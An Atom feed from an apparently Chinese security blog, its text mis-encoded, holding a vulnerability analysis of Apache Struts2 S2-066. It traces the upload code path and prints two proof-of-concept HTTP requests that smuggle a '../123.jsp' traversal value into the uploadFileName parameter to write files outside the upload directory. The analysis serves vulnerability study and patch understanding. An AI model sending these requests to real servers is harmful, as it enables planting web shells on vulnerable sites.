<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ki10Moc&#39;s World</title>
  
  
  <link href="https://ki10moc.github.io/atom.xml" rel="self"/>
  
  <link href="https://ki10moc.github.io/"/>
  <updated>2023-12-11T14:46:13.000Z</updated>
  <id>https://ki10moc.github.io/</id>
  
  <author>
    <name>ki10Moc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>S2-066åˆ†æ</title>
    <link href="https://ki10moc.github.io/2023/12/11/S2-066%E5%88%86%E6%9E%90/"/>
    <id>https://ki10moc.github.io/2023/12/11/S2-066%E5%88%86%E6%9E%90/</id>
    <published>2023-12-11T09:36:36.000Z</published>
    <updated>2023-12-11T14:46:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´æè¿°"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°">#</a> æ¼æ´æè¿°</h2><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211095248309.png" alt="image-20231211095248309"></p><h2 id="å½±å“ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬">#</a> å½±å“ç‰ˆæœ¬</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.5</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">2.5</span><span class="number">.32</span></span><br><span class="line"><span class="number">6.0</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">6.3</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="ä¿®å¤ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#ä¿®å¤ç‰ˆæœ¬">#</a> ä¿®å¤ç‰ˆæœ¬</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts2 &gt;= <span class="number">2.5</span><span class="number">.33</span></span><br><span class="line">Apache Struts2 &gt;= <span class="number">6.3</span><span class="number">.0</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a class="markdownIt-Anchor" href="#ç¯å¢ƒæ­å»º">#</a> ç¯å¢ƒæ­å»º</h2><p>æµ‹è¯•ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.3</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ç™¾åº¦ç½‘ç›˜</p><h2 id="æ¼æ´åˆ†æ"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ">#</a> æ¼æ´åˆ†æ</h2><p>é¦–å…ˆçœ‹ä¸‹å®˜æ–¹ä¿®å¤çš„ä»£ç </p><p><a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰å‡ å¤„éƒ½è®²å‚æ•°è½¬æ¢ä¸ºå°å†™ï¼Œæ¼æ´åº”è¯¥å’Œè¿™ä¸ªæœ‰å…³ç³»</p><p>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 248</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">This is test</span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145549898.png" alt="image-20231211145549898"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145930148.png" alt="image-20231211145930148"></p><p>æ‰“ä¸Šæ–­ç‚¹çœ‹ä¸‹æµç¨‹</p><p>åœ¨ org.apache.struts2.interceptor.FileUploadInterceptor#intercept ä¸­</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211151544422.png" alt="image-20231211151544422"></p><p>è¿™é‡Œé€šè¿‡ multiWrapper.getFileNames æ–¹æ³•ï¼Œå¯¹ wrapper å°è£…çš„ request å¯¹è±¡ä»¥åŠ inputname æ¥è·å–åˆ° filename</p><p>é€šè¿‡æ•°ç»„åŠ è½½è¿› accept æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211154023490.png" alt="image-20231211154023490"></p><p>ç„¶ååˆ¤æ–­ä¸ä¸ºç©ºå¼€å§‹éå† acceptï¼Œå°†å…¶åŠ è½½è¿›å‚æ•°</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211161357489.png" alt="image-20231211161357489"></p><p>å†æ¥çœ‹ strut æ˜¯å¦‚ä½•å¤„ç†æ–‡ä»¶åçš„</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211163356689.png" alt="image-20231211163356689"></p><p>å¤§æ¦‚ç†è§£ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getCanonicalName</span><span class="params">(<span class="keyword">final</span> String originalFileName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> originalFileName;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">forwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">backwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (forwardSlash != -<span class="number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;</span><br><span class="line">            fileName = fileName.substring(forwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fileName = fileName.substring(backwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒ¹é…æœ€åä¸€ä¸ª / çš„ä½ç½®</p><p>åœ¨æœ¬ä¾‹ä¸­åˆ™ä¸º 2ï¼Œä¹Ÿå°±æ˜¯ forwardSlash</p><p>è€Œâ€¦/1.txt ä¸­æ²¡æœ‰ \\</p><p>æ‰€ä»¥ backwardSlash ä¸º - 1</p><p>æ‰€ä»¥ if æ¡ä»¶æ»¡è¶³</p><p>æ‰§è¡Œ fileName = fileName.substring (forwardSlash + 1);</p><p>èµ‹å€¼æ–°çš„ filenameï¼Œä¹Ÿå°±æ˜¯ / åé¢çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚çš„æ–‡ä»¶ 1.txt</p><p>æœ€ç»ˆè¿”å›</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211164346848.png" alt="image-20231211164346848"></p><p>å¹¶ set å­˜å‚¨åˆ°ä¸Šä¼ å¯¹è±¡ä¸­</p><p>è¿™æ®µä»£ç ä¹Ÿå°±æ˜¯æ‹¦æˆªäº†è·¯å¾„ç©¿è¶Š</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211171719991.png" alt="image-20231211171719991"></p><p>ä»¥ä¸Šä¸Šä¼ æ–‡ä»¶çš„å¯¹è±¡æœ€ç»ˆä¼šä¿å­˜åˆ° HttpParameter å‚æ•°ä¸­</p><p>æ‰€ä»¥çœ‹ä¸‹æ˜¯ä¸æ˜¯å¯ä»¥å˜é‡è¦†ç›–</p><p>å…¶å®åˆšå‡ºçš„æ—¶å€™çœ‹è¿‡å®˜æ–¹çš„ commitï¼Œçœ‹åˆ°ä¿®æ”¹äº†å‡ ä¸ªå°å†™</p><p>æˆ‘æƒ³åˆ°çš„å°±æ˜¯å¤§å°å†™ç»•è¿‡ï¼Œä½†æ˜¯ä¸å¯èƒ½è¿™ä¹ˆç®€å•ï¼Œå°±åœ¨æƒ³æ˜¯ä¸æ˜¯ä»€ä¹ˆåœ°æ–¹æˆ–è€…æ˜¯ä»€ä¹ˆåŠ è½½å™¨ä¹ŸåŠ è½½äº†æ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹ï¼Œå¯¼è‡´æ–‡ä»¶ä¸Šä¼ ã€‚</p><p>å…ˆæ¥çœ‹çœ‹ä¸Šä¸‹æ–‡å¯¹è±¡è·å–çš„å¤§æ¦‚æµç¨‹</p><p>ä¸Šä¸‹æ–‡æ˜¯ä» ac.getParameters () è·å–çš„</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175525092.png" alt="image-20231211175525092"></p><p>ä¸€ç›´è·Ÿè¿›åˆ° ActionContext ä¸‹çš„ get æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175927070.png" alt="image-20231211175927070"></p><p>ä¸‹é¢å°±æ˜¯æ‰¾ä¸Šä¸‹æ–‡çš„åˆ›å»ºï¼Œåœ¨ org.apache.struts2.dispatcher.Dispatcher#serviceAction</p><p>è¿™é‡Œè·å–ä¸Šä¸‹æ–‡æ˜¯ map ç»“æ„å­˜å‚¨ï¼Œkey å”¯ä¸€</p><p>é‚£è¿™é‡Œå°±ä¸å¤ªå¯èƒ½å­˜åœ¨å˜é‡è¦†ç›–</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211180829481.png" alt="image-20231211180829481"></p><p>ç„¶åå†çœ‹ä¼šä¸ä¼šæ˜¯å‚æ•°ç»‘å®š</p><p>åœ¨ com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211195921775.png" alt="image-20231211195921775"></p><p>è¿™é‡Œå‚æ•°ç»‘å®šä¼šç»è¿‡ä¸‰ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params.entrySet()</span><br><span class="line">parameters.entrySet()</span><br><span class="line">acceptableParameters.entrySet()</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ params å’Œ parameters éƒ½æ˜¯é€šè¿‡ HttpParamteters å¯¹è±¡åŠ è½½ä¸Šä¼ æ–‡ä»¶å’Œç±»å‹ï¼Œå†…å®¹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201631821.png" alt="image-20231211201631821"></p><p>è€Œ acceptableParameters æ˜¯é€šè¿‡ TreeMap åŠ è½½çš„</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201808865.png" alt="image-20231211201808865"></p><p>ä½†æ˜¯è¿™ä¸ªåŠ è½½æ˜¯æœ‰é¡ºåºçš„</p><p>é€šè¿‡ä»£ç æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªTreeMapå¯¹è±¡</span></span><br><span class="line">        TreeMap&lt;Object, Object&gt; objectObjectTreeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘TreeMapä¸­æ·»åŠ ä¸¤ä¸ªé”®å€¼å¯¹</span></span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°TreeMapå¯¹è±¡</span></span><br><span class="line">        System.out.println(objectObjectTreeMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201017453.png" alt="image-20231211201017453"></p><p>å¯ä»¥çœ‹åˆ°ä¼šä¼˜å…ˆå¤§å†™çš„</p><p>è¿™é‡Œç›´æ¥è·Ÿç€ Y4 çˆ·çš„æ­¥ä¼ã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 188</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------</span></span><br><span class="line"><span class="comment">xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span></span><br><span class="line"><span class="comment">(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1aaa</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;UPloadFileName&quot;;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment">1323.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure><p>åœ¨ ognl.OgnlRuntime#_getSetMethod è·å– setter â½…æ³•æ—¶è°ƒâ½¤äº† ognl.OgnlRuntime#getDeclaredMethods åšå¤„ç†</p><p>è¿™é‡Œäº†éå†æ–¹æ³•åï¼ŒåŠ è½½åˆ° set æ–¹æ³•ï¼ŒsetUpload</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213047462.png" alt="image-20231211213047462"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214207202.png" alt="image-20231211214207202"></p><p>å¾—åˆ°å€¼ä¸º 1ï¼Œä¹Ÿå°±æ˜¯ public ä¿®é¥°ç¬¦</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213810889.png" alt="image-20231211213810889"></p><p>åå»å°±æ˜¯ m çš„å€¼èµ‹ç»™æ–°çš„æˆå‘˜å˜é‡ï¼Œåˆ°è¾¾ result è¿”å›</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214418882.png" alt="image-20231211214418882"></p><p>æœ€ç»ˆé€šè¿‡_getSetMethod è¿”å› method</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214607186.png" alt="image-20231211214607186"></p><p>ä¸­é—´å°±éƒ½æ˜¯ä¸€äº›ç±»çš„å¤„ç†ï¼Œä¸æ˜¯å¾ˆé‡è¦</p><p>æˆ‘ä»¬ç›´æ¥çœ‹ addIfAccessor æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addIfAccessor</span><span class="params">(List result, Method method, String baseName, <span class="type">boolean</span> findSets)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ms</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (ms.endsWith(baseName)) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isSet</span> <span class="operator">=</span> <span class="literal">false</span>, isIs = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX)</span><br><span class="line">                    || (isIs = ms.startsWith(IS_PREFIX))) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefixLength</span> <span class="operator">=</span> (isIs ? <span class="number">2</span> : <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">if</span> (isSet == findSets) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (baseName.length() == (ms.length() - prefixLength)) &#123;</span><br><span class="line">                        result.add(method);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ¢³ç†ä¸‹é€»è¾‘</p><p>é¦–å…ˆæ£€æŸ¥æ–¹æ³•åæ˜¯å¦æ˜¯ä»¥â€™baseNameâ€™ç»“å°¾</p><p>å¦‚æœæ˜¯ï¼Œè¿›ä¸€æ­¥æ£€æŸ¥æ˜¯å¦ä»¥å‡ ä¸ªå‰ç¼€å¼€å§‹çš„</p><p>å¦‚æœæ˜¯ is å¼€å¤´é•¿åº¦ä¸º 2ï¼Œä¸æ˜¯åˆ™ä¸º 3</p><p>å¦‚æœå’Œè¦æ‰¾çš„è®¾ç½®å™¨å“åº¦ç›¸ç­‰ï¼Œå°±æ¯”è¾ƒ ms æ–¹æ³•å‡å»å‰ç¼€ï¼Œå…¶å®ä¹Ÿå°±æ˜¯ baseName çš„æ–¹æ³•åï¼Œå¦‚æœä¸€è‡´ï¼Œå°±æ·»åŠ åˆ° result ä¸­</p><p>å…¶ä¸­å…³äº baseNameï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ getDeclaredMethods</p><p>å…¶ä¸­è¿™éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">baseName</span> <span class="operator">=</span> capitalizeBeanPropertyName(propertyName);</span><br><span class="line">                    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                    collectAccessors(targetClass, baseName, result, findSets);</span><br></pre></td></tr></table></figure><p>ç»è¿‡ capitalizeBeanPropertyName æ–¹æ³•å¤„ç†åå¾—åˆ° baseName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æè¿°ä¸‹å°±æ˜¯ï¼Œå¦‚æœä¼ è¿‡æ¥çš„ baseNameï¼Œé¦–å­—æ¯æ˜¯å°å†™çš„ï¼Œç¬¬äºŒä¸ªå­—æ¯æ˜¯å¤§å†™çš„ï¼Œç›´æ¥è¿”å›</p><p>å¦åˆ™å°±å¤§å†™ç¬¬ä¸€ä¸ªå­—æ¯è¿”å›</p><p>åˆå› ä¸ºæˆ‘ä»¬è¦è§¦å‘çš„æ˜¯ com.struts2.UploadAction#setUploadFileName</p><p>å…¶ä¸­ baseName ä¹Ÿå°±æ˜¯ UploadFileName</p><p>é‚£å°±åªèƒ½å†™æˆ UploadFileName æˆ–è€…æ˜¯ uploadFileName</p><p>poc1ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;uploadFileName&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">../123.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205052719.png" alt="image-20231211205052719"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205122110.png" alt="image-20231211205122110"></p><p>poc2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action?uploadFileName=../<span class="number">1234.</span>jsp HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205158357.png" alt="image-20231211205158357"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205213052.png" alt="image-20231211205213052"></p><h2 id="æ¼æ´ä¿®å¤"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤">#</a> æ¼æ´ä¿®å¤</h2><p>çœ‹ diff ä¸éš¾å‘ç°å®˜æ–¹å°†ä¼ é€’çš„å‚æ•°æ”¹ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œ<em>æ£€æŸ¥å½“å‰é”®æ˜¯å¦ä¸ nameLowerCase ç›¸ç­‰ï¼Œå¿½ç•¥å¤§å°å†™</em>ï¼Œè¿™æ ·å°±ä¼šè¦†ç›–æˆ‘ä»¬ä¼ é€’çš„å€¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ¼æ´æè¿°&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#æ¼æ´æè¿°&quot;&gt;#&lt;/a&gt; æ¼æ´æè¿°&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/ki10Moc/img/main/imag</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Struts2" scheme="https://ki10moc.github.io/tags/Struts2/"/>
    
    <category term="CVE" scheme="https://ki10moc.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>å†…å­˜é©¬åŸºç¡€å­¦ä¹ (ä¸€)</title>
    <link href="https://ki10moc.github.io/2023/08/01/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
    <id>https://ki10moc.github.io/2023/08/01/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</id>
